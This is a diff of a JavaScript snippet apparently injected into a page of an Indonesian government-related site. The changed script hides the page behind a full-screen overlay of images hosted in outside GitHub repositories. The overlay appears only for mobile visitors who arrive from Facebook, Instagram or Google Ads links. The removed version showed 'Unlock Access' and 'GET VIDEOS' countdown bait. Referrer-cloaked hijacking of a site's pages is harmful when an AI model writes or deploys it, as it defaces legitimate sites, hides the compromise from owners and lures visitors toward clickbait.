@@ -6,7 +6,9 @@
     const allowedReferrers = ['facebook.com', 'instagram.com', 'googleadservices.com'];
     const isAllowedReferrer = allowedReferrers.some(domain => referrer.includes(domain));
 
-    if ((currentUrl === targetUrl || currentUrl === targetUrl + "/") && isAllowedReferrer) {
+    const isMobile = /android|iphone|ipad|ipod|mobile/i.test(navigator.userAgent);
+
+    if ((currentUrl === targetUrl || currentUrl === targetUrl + "/") && isAllowedReferrer && isMobile) {
         
         const style = document.createElement('style');
         style.innerHTML = `
@@ -14,22 +16,37 @@
                 position: fixed;
                 top: 0;
                 left: 0;
-                width: 100vw;
-                height: 100vh;
+                width: 100%;
+                height: 100%;
                 z-index: 99999999;
-                background-color: #9a94a1;
-                display: flex; 
-                flex-direction: column;
-                justify-content: center;
-                align-items: center;
+                margin: 0;
+                padding: 0;
                 box-sizing: border-box;
-                padding: 20px;
-                text-align: center;
+                background: url('https://cdn.jsdelivr.net/gh/masterkaur/dae-pemerintahan/lpx.webp') no-repeat top center;
+                background-size: 100% auto;
+                overflow-y: auto;
             }
-            .dscr-penyelenggaraan-pemerintahan img {
-                max-width: 100%;
+
+            .dscr-penyelenggaraan-pemerintahan::before {
+                content: "";
+                position: fixed;
+                inset: 0;
+                background: rgba(0,0,0,0.4);
+                z-index: 1;
+            }
+
+            .dscr-center-image {
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 2;
+                width: 90%;
+                max-width: 500px;
                 height: auto;
+                pointer-events: none;
             }
+
             @media (min-width: 769px) {
                 .dscr-penyelenggaraan-pemerintahan {
                     display: none !important;
@@ -41,39 +58,17 @@
         const div = document.createElement('div');
         div.className = 'dscr-penyelenggaraan-pemerintahan';
         div.id = 'dscr-penyelenggaraanWrapper';
+
         div.innerHTML = `
-            <h1 id="dscr-pemerintahan-dae" style="text-align: center; margin-top: 0;"><span style="color: #ff0000;">Unlock Access</span></h1>
-            <br/>
-            <button id="dscr-daeButton" style="padding: 10px 20px; font-size: 16px;">Loading..</button>
-            <img id="dscr-penyelenggaraan-pemerintahanImage" style="display:none;" src="https://cdn.jsdelivr.net/gh/spacebintuhan/bacakoran/click-play-video.gif" /> 
-            <br/>
-            <center><p>Cant work? Reload This Page!</p></center>
+            <img class="dscr-center-image" src="https://cdn.jsdelivr.net/gh/masterkaur/dae-pemerintahan/dae.gif" />
         `;
 
         if (document.body) {
             document.body.appendChild(div);
-            startCountdown();
         } else {
             document.addEventListener('DOMContentLoaded', () => {
                 document.body.appendChild(div);
-                startCountdown();
             });
-        }
-
-        function startCountdown() {
-            let timeLeft = 2;
-            const downloadButton = document.getElementById("dscr-daeButton");
-            const gifImage = document.getElementById("dscr-penyelenggaraan-pemerintahanImage");
-
-            const countdown = setInterval(() => {
-                downloadButton.textContent = `GET VIDEOS ${timeLeft} SECOND`;
-                timeLeft--;
-                if (timeLeft < 0) {
-                    clearInterval(countdown);
-                    downloadButton.style.display = "none";
-                    gifImage.style.display = "inline";
-                }
-            }, 1000);
         }
     }
 })();
